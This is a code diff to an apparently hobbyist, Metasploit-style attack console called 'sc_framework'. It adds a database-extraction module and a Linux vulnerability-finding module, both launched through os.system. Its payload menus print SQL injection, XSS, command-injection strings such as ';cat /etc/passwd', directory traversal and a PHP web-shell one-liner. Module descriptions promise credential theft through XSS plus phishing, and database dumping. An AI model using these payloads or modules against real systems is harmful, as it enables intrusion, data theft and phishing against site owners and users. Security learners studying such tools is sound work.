@@ -144,8 +144,8 @@ color.red + """
     print(random_banner)
     print()
     print()
-    print(color.white + "        *[ " + color.red + "sc_framework v0.6" + color.white + "                          ]")
-    print("        *[ 28 exploits / 16 cve exploits / 10 payloads ]")
+    print(color.white + "        *[ " + color.red + "sc_framework v0.7" + color.white + "                          ]")
+    print("        *[ 30 exploits / 16 cve exploits / 10 payloads ]")
     print()
     print("sc_framework tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
     print()
@@ -212,7 +212,9 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
 """ + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
 """ + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
 """ + color.red + """site/reverse_http""" + color.white + """                                   25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
-""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 7:10        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
+""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 07:10       This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
+""" + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08 09:27       find vulnerabilities like common open ports, if the password is weak, the kernal version.
+""" + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30       extract sensitive information with the payloads have, extract informations like tables, columns, databases.
 """)
     elif scconsole == "search exploit":
         print("""
@@ -291,11 +293,13 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
     Exploits                                        When created?        Discrepstion 
 """ + color.red + """linux/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
 """ + color.red + """linux/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
+""" + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08 09:27       find vulnerabilities like common open ports, if the password is weak, the kernal version.
 """)
     elif scconsole == "search server":
         print("""
     Exploits                                        When created?        Discrepstion 
-""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 7:10        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
+""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 07:10        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
+""" + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30        extract sensitive information with the payloads have, extract informations like tables, columns, databases.
 """)
     elif scconsole == "show payloads":
         print("""
@@ -455,6 +459,14 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
         time.sleep(0.5)
         print("using server/browser_autopwn2.")
         sserverbrowserautopwn2()
+    elif scconsole == "use server/extract_table_db_column":
+        time.sleep(0.5)
+        print("using server/extract_table_db_column.")
+        sserverextracttabledbcolumn()
+    elif scconsole == "use linux/vulnerability-find":
+        time.sleep(0.5)
+        print("using linux/vulnerability-find.")
+        lexploitvulnerabilityfind()
     elif scconsole == "use system commands":
             OSconsole()
             OSconsole()
@@ -1036,21 +1048,25 @@ you will specifiy these options when you run or exploit it!
         texploitfindvulnerabiliteswebsite2()
     elif scconsole26 == "show payloads":
         print("""
-' OR 1=1--   ---> SQL Injection payload.
+""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.
 
-' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.
+""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.
 
-<script>alert('XSS')</script>  ---> cross site XSS alert payload.
+""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.
 
-<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
+""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.
 
-;whoami  ---> remote code execute whoami payload.
+""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.
 
-;cat /etc/passwd  ---> remote code execute cat payload.
+""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.
 
-../../../../etc/passwd  ---> directory traversal etc/passwd payload.
+""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.
 
-<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
+""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.
+
+""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.
+
+""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
 """)
         texploitfindvulnerabiliteswebsite2()
     elif scconsole26 == "run":
@@ -1821,8 +1837,8 @@ you will specifiy these options when you run or exploit it!
         exit()
 
 def sserverbrowserautopwn2():
-    scconsole26 = input("sc~" + color.red + "(server/browser_autopwn2)" + color.white + ">")
-    if scconsole26 == "help":
+    scconsole47 = input("sc~" + color.red + "(server/browser_autopwn2)" + color.white + ">")
+    if scconsole47 == "help":
         print("""
 help ---> to see this help menu.
 clear ---> to clear the screen.
@@ -1834,10 +1850,10 @@ show options ---> to see the options.
 show payloads ---> to see avalable payloads in sc-framework.
 """)
         sserverbrowserautopwn2()
-    elif scconsole26 == "clear":
+    elif scconsole47 == "clear":
         os.system('clear')
         sserverbrowserautopwn2()
-    elif scconsole26 == "show options":
+    elif scconsole47 == "show options":
         print("""
 OPTIONS          | DISCREPTIONS
 -----------------|----------------------
@@ -1849,7 +1865,7 @@ please copy the payload you want by typing (show payloads)!
 you will specifiy these options when you run or exploit it!
 """)
         sserverbrowserautopwn2()
-    elif scconsole26 == "show payloads":
+    elif scconsole47 == "show payloads":
         print("""
 <script>alert('XSS')</script>  ---> cross site XSS alert payload.
 
@@ -1860,23 +1876,125 @@ you will specifiy these options when you run or exploit it!
 javascript:alert('XSS')  ---> cross site XSS javascript payload.
 """)
         sserverbrowserautopwn2()
-    elif scconsole26 == "run":
+    elif scconsole47 == "run":
         targetsite = input("URL: ")
         payload10 = input("PAYLOAD: ")
         phishingurl = input("PHISHING URL: ")
         os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite} -p "{payload10}" -ph {phishingurl}')
         sserverbrowserautopwn2()
-    elif scconsole26 == "exploit":
+    elif scconsole47 == "exploit":
         targetsite2 = input("URL: ")
         payload101 = input("PAYLOAD: ")
         phishingurl2 = input("PHISHING URL: ")
         os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite2} -p "{payload101}" -ph {phishingurl2}')
         sserverbrowserautopwn2()
-    elif scconsole26 == "unuse":
+    elif scconsole47 == "unuse":
         print("unusing server/browser_autopwn2.")
         time.sleep(0.5)
         Console()
-    elif scconsole26 == "exit":
+    elif scconsole47 == "exit":
+        exit()
+
+def sserverextracttabledbcolumn():
+    scconsole48 = input("sc~" + color.red + "(server/extract_table_db_column)" + color.white + ">")
+    if scconsole48 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+show payloads ---> to see avalable payloads in sc-framework.
+""")
+        sserverextracttabledbcolumn()
+    elif scconsole48 == "clear":
+        os.system('clear')
+        sserverextracttabledbcolumn()
+    elif scconsole48 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target URL.
+PAYLOAD          | specifiy the payload(you don't need to specifiy it uses own payloads!).
+
+please copy the payload you want by typing (show payloads)!
+you will specifiy these options when you run or exploit it!
+""")
+        sserverextracttabledbcolumn()
+    elif scconsole48 == "show payloads":
+        print("""
+""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.
+
+""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.
+
+""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.
+
+""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.
+
+""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.
+
+""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.
+
+""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.
+
+""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.
+
+""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.
+
+""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
+""")
+        sserverextracttabledbcolumn()
+    elif scconsole48 == "run":
+        os.system(f'python exploits/server/extract_table_db_column.py')
+        sserverextracttabledbcolumn()
+    elif scconsole48 == "exploit":
+        os.system(f'python exploits/server/extract_table_db_column.py')
+        sserverextracttabledbcolumn()
+    elif scconsole48 == "unuse":
+        print("unusing server/extract_table_db_column.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole48 == "exit":
+        exit()
+
+def lexploitvulnerabilityfind():
+    scconsole49 = input("sc~" + color.red + "(linux/vulnerability-find)" + color.white + ">")
+    if scconsole49 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        lexploitvulnerabilityfind()
+    elif scconsole49 == "clear":
+        os.system('clear')
+        lexploitvulnerabilityfind()
+    elif scconsole49 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target ip address.
+
+you will specifiy these options when you run or exploit it!
+""")
+        lexploitvulnerabilityfind()
+    elif scconsole49 == "run":
+        os.system('python exploits/linux/vulnerability-find.py')
+        lexploitvulnerabilityfind()
+    elif scconsole49 == "exploit":
+        os.system('python exploits/linux/vulnerability-find.py')
+        lexploitvulnerabilityfind()
+    elif scconsole49 == "unuse":
+        print("unusing linux/vulnerability-find.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole49 == "exit":
         exit()
 
 def OSconsole():
